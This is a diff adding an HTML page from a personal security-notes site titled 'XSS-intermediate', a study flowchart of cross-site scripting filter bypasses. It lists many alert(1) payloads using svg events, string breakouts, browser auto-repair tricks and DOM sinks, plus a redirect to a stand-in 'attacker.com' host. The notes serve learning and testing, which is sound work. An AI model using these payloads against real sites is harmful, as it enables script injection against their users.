@@ -1,0 +1,468 @@
+<!DOCTYPE html>
+<html lang="en" class="dark">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>XSS-intermediate | Shamveel's Cybersecurity Notes</title>
+    <script src="https://cdn.tailwindcss.com"></script>
+    <script>
+        tailwind.config = {
+            darkMode: 'class',
+            theme: {
+                extend: {
+                    colors: {
+                        'cyber-accent': '#3b82f6',
+                        'cyber-accent-light': '#cbd5e1',
+                        'cyber-accent-dark': '#64748b',
+                    },
+                    animation: {
+                        'fade-in': 'fadeIn 300ms ease-in-out',
+                        'slide-in': 'slideIn 300ms ease-in-out',
+                    },
+                    keyframes: {
+                        fadeIn: {
+                            '0%': { opacity: '0' },
+                            '100%': { opacity: '1' }
+                        },
+                        slideIn: {
+                            '0%': { transform: 'translateX(-100%)' },
+                            '100%': { transform: 'translateX(0)' }
+                        }
+                    }
+                }
+            }
+        }
+    </script>
+    <link rel="stylesheet" href="../css/noteStyle.css">
+    <style>
+        #note-content h1 {
+            font-size: 2.25rem;
+            line-height: 2.5rem;
+            font-weight: 700;
+            margin-top: 2rem;
+            margin-bottom: 1rem;
+            color: #3b82f6;
+        }
+        #note-content h2 {
+            font-size: 1.5rem;
+            line-height: 2rem;
+            font-weight: 600;
+            margin-top: 1.5rem;
+            margin-bottom: 0.75rem;
+            color: #3b82f6;
+        }
+        #note-content h3 {
+            font-size: 1.25rem;
+            line-height: 1.75rem;
+            font-weight: 600;
+            margin-top: 1.25rem;
+            margin-bottom: 0.5rem;
+            color: #3b82f6;
+        }
+        #note-content h4 {
+            font-size: 1.125rem;
+            line-height: 1.5rem;
+            font-weight: 600;
+            margin-top: 1rem;
+            margin-bottom: 0.5rem;
+            color: #3b82f6;
+        }
+        #note-content h5 {
+            font-size: 1rem;
+            line-height: 1.25rem;
+            font-weight: 600;
+            margin-top: 0.75rem;
+            margin-bottom: 0.5rem;
+            color: #3b82f6;
+        }
+        #note-content h6 {
+            font-size: 0.875rem;
+            line-height: 1.25rem;
+            font-weight: 600;
+            margin-top: 0.5rem;
+            margin-bottom: 0.25rem;
+            color: #3b82f6;
+        }
+        
+        #note-content code {
+            background-color: #0e3855;
+            color: #cbd5e1;
+            padding: 0.2em 0.4em;
+            border-radius: 0.25rem;
+            font-size: 0.875em;
+        }
+        
+        #note-content pre {
+            background-color: #1a1a25;
+            border: 1px solid #374151;
+            margin:0;
+        }
+        
+        #note-content pre code {
+            background-color: transparent;
+            padding: 0;
+        }
+        
+        #note-content blockquote {
+            border-left: 4px solid #3b82f6;
+            background-color: rgba(59, 130, 246, 0.1);
+        }
+        
+        #note-content a {
+            color: #3b82f6;
+        }
+        
+        #note-content a:hover {
+            color: #60a5fa;
+        }
+        
+        #note-content table {
+            border-collapse: collapse;
+        }
+        
+        #note-content th, #note-content td {
+            border: 1px solid #374151;
+            padding: 0.5rem;
+        }
+        
+        #note-content th {
+            background-color: #1a1a25;
+        } 
+        
+        #note-content ::-webkit-scrollbar {
+            width: 8px;
+        }
+        
+        #note-content ::-webkit-scrollbar-track {
+            background: #111118;
+        }
+        
+        #note-content ::-webkit-scrollbar-thumb {
+            background: #3b82f6;
+            border-radius: 4px;
+        }
+        
+        #note-content ::-webkit-scrollbar-thumb:hover {
+            background: #60a5fa;
+        }
+    </style>
+</head>
+<body class="bg-gray-900 text-gray-100 font-mono">
+    <!-- Mobile Menu Button -->
+    <button id="mobile-menu-btn" class="lg:hidden fixed top-4 left-4 z-50 bg-gray-800 p-2 rounded-md border border-gray-700 transition-all duration-300 hover:border-cyber-accent">
+        <svg class="w-6 h-6" fill="none" stroke="currentColor" viewBox="0 0 24 24">
+            <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M4 6h16M4 12h16M4 18h16"></path>
+        </svg>
+    </button>
+    <!-- Sidebar -->
+    <aside id="sidebar" class="fixed left-0 top-0 h-full w-64 bg-gray-800 border-r border-gray-700 transform -translate-x-full lg:translate-x-0 transition-transform duration-300 ease-in-out z-40">
+        <div class="p-6">
+            <button id="sidebar-close-btn" class="absolute top-4 right-4 z-50 text-gray-400 hover:text-cyber-accent transition-colors hidden">
+                <svg class="w-6 h-6" fill="none" stroke="currentColor" viewBox="0 0 24 24">
+                    <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M6 18L18 6M6 6l12 12"></path>
+                </svg>
+            </button>
+            <div class="mb-8">
+                <h1 class="text-xl font-bold text-cyber-accent">
+                    <span class="text-gray-100">$</span> cybersec_notes
+                </h1>
+                <p class="text-sm text-gray-400 mt-1">Security Research Hub</p>
+            </div>
+            <nav class="space-y-4">
+                <a href="../index.html" class="flex items-center space-x-3 p-3 rounded-lg bg-gray-700 text-cyber-accent border border-gray-600">
+                    <span class="text-lg">🏠</span>
+                    <span>Home</span>
+                </a>
+                <a href="../about.html" class="nav-link flex items-center space-x-3 p-3 rounded-lg hover:bg-gray-700 transition-colors">
+                    <span class="text-lg">👨‍💻</span>
+                    <span>About the Developer</span>
+                </a>
+            </nav>
+            <div class="mt-8">
+                <label class="flex items-center space-x-2 text-sm text-gray-400 mb-3">
+                    <span class="text-lg">📊</span>
+                    <span>Word Count</span>
+                </label>
+                <div id="word-count" class="text-xl font-bold text-cyber-accent"></div>
+                <div class="text-xs text-gray-500 mt-1">
+                        <span id="char-count">3464</span> characters
+                </div>
+            </div>
+            <div class="mt-8 p-4 bg-gray-700 rounded-lg border border-gray-600 animate-fade-in">
+                <div class="text-sm text-gray-400">Note Details</div>
+                <div class="mt-2 text-sm text-gray-300">
+                    <div class="mt-1">Updated: 2025-07-24</div>
+                    <div class="mt-2 flex flex-wrap gap-1">
+                        <span class="bg-red-900 text-red-200 px-2 py-1 rounded text-xs">Web Security</span> <span class="bg-red-900 text-red-200 px-2 py-1 rounded text-xs">Exploitation</span>
+                        <span class="bg-blue-900 text-blue-200 px-2 py-1 rounded text-xs">Web Security</span>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </aside>
+    <div id="sidebar-overlay" class="fixed inset-0 bg-black bg-opacity-50 z-30 lg:hidden hidden transition-opacity duration-300"></div>
+    <main class="lg:ml-64 min-h-screen transition-transform duration-300">
+        <div class="p-6 lg:p-8">
+            <header class="mb-8 pb-4 border-b border-gray-700">
+                <div class="flex items-start justify-between">
+                    <div>
+                        <h1 class="text-3xl lg:text-4xl font-bold mb-2 text-cyber-accent">
+                            XSS-intermediate
+                        </h1>
+                        <div class="flex items-center space-x-4 text-sm text-gray-500">
+                            <span>Last updated: 2025-07-24</span>
+                            <span>•</span>
+                            <span id="reading-time">Reading time: 0 min</span>
+                        </div>
+                    </div>
+                    <div class="flex flex-wrap gap-2">
+                        <span class="bg-red-900 text-red-200 px-2 py-1 rounded text-xs">Web Security</span> <span class="bg-red-900 text-red-200 px-2 py-1 rounded text-xs">Exploitation</span>
+                        <span class="bg-blue-900 text-blue-200 px-2 py-1 rounded text-xs">Web Security</span>
+                    </div>
+                </div>
+            </header>
+            <article id="note-content" class="prose prose-invert max-w-none text-gray-300">
+                <h2>🧠 Intermediate to Advanced XSS Attack Flow</h2>
+</br>
+
+
+<h3>✅ 1. <strong>Test Classic Injection First</strong></h3>
+<ul>
+<li><p>Try:</p>
+<pre><code class="language-html">&lt;script&gt;alert(1)&lt;/script&gt;
+</code></pre>
+</li>
+<li><p>If blocked → move to bypasses.</p>
+</li>
+</ul>
+</br>
+
+
+<hr>
+</br>
+
+
+<h3>🔄 2. <strong>Tag Filtering? → Use Allowed Tags (e.g. <code>&lt;svg&gt;</code>, <code>&lt;math&gt;</code>, etc.)</strong></h3>
+<ul>
+<li><p>Try allowed tags with events:</p>
+<pre><code class="language-html">&lt;svg onload=alert(1)&gt;
+&lt;svg&gt;&lt;animateTransform onbegin=alert(1)&gt;
+</code></pre>
+</li>
+<li><p>If attributes are stripped → try payloads <em>without quotes</em> or use unusual events:</p>
+<pre><code class="language-html">&lt;svg&gt;&lt;set attributeName=&quot;x&quot; to=&quot;1&quot; onbegin=alert(1)&gt;
+</code></pre>
+</li>
+</ul>
+</br>
+
+
+
+<hr>
+</br>
+
+
+
+<h3>🛠️ 3. <strong>Quotes Filtered or Escaped? → Handle Encoding &amp; Escaping</strong></h3>
+<ul>
+<li><p>If <code>&quot;</code> or <code>&#39;</code> are escaped with backslashes:</p>
+<ul>
+<li><p>Try escaping the escape:</p>
+<pre><code class="language-js">\&quot; or \&#39;
+\\\&quot; or \\\&#39;
+</code></pre>
+</li>
+</ul>
+</li>
+<li><p>Use HTML encoding:</p>
+<ul>
+<li><code>&quot;</code> → <code>&amp;#34;</code></li>
+<li><code>&#39;</code> → <code>&amp;#39;</code></li>
+<li><code>&lt;</code> → <code>&amp;lt;</code></li>
+<li><code>&gt;</code> → <code>&amp;gt;</code></li>
+</ul>
+</li>
+<li><p>No quotes? → Use <strong>unquoted attributes</strong>:</p>
+<pre><code class="language-html">&lt;img src=x onerror=alert(1)&gt;
+</code></pre>
+</li>
+</ul>
+</br>
+
+
+
+<hr>
+</br>
+
+
+
+<h3>📉 4. <strong>Input Ends Up Inside a String? → Break It!</strong></h3>
+<ul>
+<li><p>Try to <strong>terminate the string</strong>:</p>
+<pre><code class="language-js">&#39;);alert(1);//
+&quot;);alert(1);// 
+</code></pre>
+</li>
+<li><p>If <code>&#39;</code> is blocked → use backtick or template string injection:</p>
+<pre><code class="language-js">${alert(1)}
+</code></pre>
+</li>
+</ul>
+</br>
+
+
+
+<hr>
+</br>
+
+
+
+<h3>🧩 5. <strong>Bypass .replace() Sanitizers</strong></h3>
+<ul>
+<li><p>If <code>.replace()</code> is only used once:</p>
+<ul>
+<li><p>Payload survives second occurrence</p>
+<pre><code class="language-js">&lt;img src=x onerror=alert(1)&gt;
+</code></pre>
+</li>
+<li><p>Try payloads with multiple characters, only first replaced.</p>
+</li>
+</ul>
+</li>
+</ul>
+</br>
+
+
+
+<hr>
+</br>
+
+
+
+<h3>🧠 6. <strong>Browser-based Auto Repair (Mangled HTML Injection)</strong></h3>
+<ul>
+<li><p>Some browsers will auto-fix broken HTML:</p>
+<ul>
+<li><p>Example: Injected input ends up in:</p>
+<pre><code class="language-html">&lt;link rel=&quot;canonical&quot; href=&quot;?&quot;&gt;
+</code></pre>
+</li>
+<li><p>Then you pass:</p>
+<pre><code>&#39;?accesskey=&#39;x&#39;onclick=&#39;alert(1)
+</code></pre>
+<p>→ Browser treats it as malformed HTML and auto-completes it like:</p>
+<pre><code class="language-html">&lt;link rel=&quot;canonical&quot; href=&quot;?&quot; accesskey=&quot;x&quot; onclick=&quot;alert(1)&quot;&gt;
+</code></pre>
+</li>
+</ul>
+</li>
+<li><p>🧠 Test this by injecting <code>&gt;</code> to prematurely break tags:</p>
+<pre><code class="language-html">&quot;&gt;&lt;svg onload=alert(1)&gt;
+</code></pre>
+</li>
+</ul>
+</br>
+
+
+
+
+<hr>
+</br>
+
+
+
+<h3>🧼 7. <strong>Comment Out Rest of Page (if needed)</strong></h3>
+<ul>
+<li><p>To kill the rest of the HTML:</p>
+<pre><code class="language-js">// or /* */
+</code></pre>
+</li>
+</ul>
+<hr>
+<h3>📦 8. <strong>Use JS Injection via DOM Sinks</strong></h3>
+<ul>
+<li><p>If input is reflected into JS, try:</p>
+<pre><code class="language-js">location = &quot;https://attacker.com&quot;
+alert(1)
+</code></pre>
+</li>
+<li><p>Dangerous sinks:</p>
+<ul>
+<li><code>document.write()</code></li>
+<li><code>innerHTML</code></li>
+<li><code>setTimeout(&quot;...&quot;)</code></li>
+<li><code>location.href = ...</code></li>
+</ul>
+</li>
+</ul>
+</br>
+
+
+
+<hr>
+</br>
+
+
+
+<h3>🎯 9. <strong>Use iframe + Event Handlers</strong></h3>
+<ul>
+<li><p>Works well if embedding is possible:</p>
+<pre><code class="language-html">&lt;iframe src=&quot;evil.html&quot; onload=alert(1)&gt;
+</code></pre>
+</li>
+</ul>
+</br>
+
+
+<hr>
+</br>
+
+
+
+<h3>🔍 10. <strong>Use Burp Repeater’s Hint</strong></h3>
+<ul>
+<li><p>If Burp shows allowed tags/attributes:</p>
+<ul>
+<li><p>Research <em>exact event model</em> on MDN.</p>
+</li>
+<li><p>Use exotic events:</p>
+<ul>
+<li><code>onfocus</code>, <code>onpointerenter</code>, <code>onmouseenter</code></li>
+</ul>
+</li>
+<li><p>Use <code>tabindex=1</code> to <strong>auto-trigger <code>onfocus</code></strong>:</p>
+<pre><code class="language-html">&lt;input autofocus onfocus=alert(1) tabindex=1&gt;
+</code></pre>
+</li>
+</ul>
+</li>
+</ul>
+</br>
+
+
+<hr>
+</br>
+
+
+<h2>💡 Summary Flowchart:</h2>
+<ol>
+<li><strong>Script tags work?</strong> ✅ done</li>
+<li><strong>Tag blocked?</strong> → Use allowed (e.g. svg, math)</li>
+<li><strong>Event handlers stripped?</strong> → Use lesser-known events</li>
+<li><strong>Quotes blocked?</strong> → Go unquoted or HTML encode</li>
+<li><strong>Input inside string?</strong> → Break out with <code>&#39;</code>, <code>&quot;</code>, backtick, or <code>${}</code></li>
+<li><strong>.replace()?</strong> → Repeat attack parts</li>
+<li><strong>Browser fixes broken tags?</strong> → Abuse auto-repair</li>
+<li><strong>Still nothing?</strong> → DOM sink? On-focus trick? iframe?</li>
+</ol>
+</br>
+
+
+<hr>
+
+            </article>
+        </div>
+    </main>
+    <script src="../js/notes.js"></script>
+</body>
+</html>
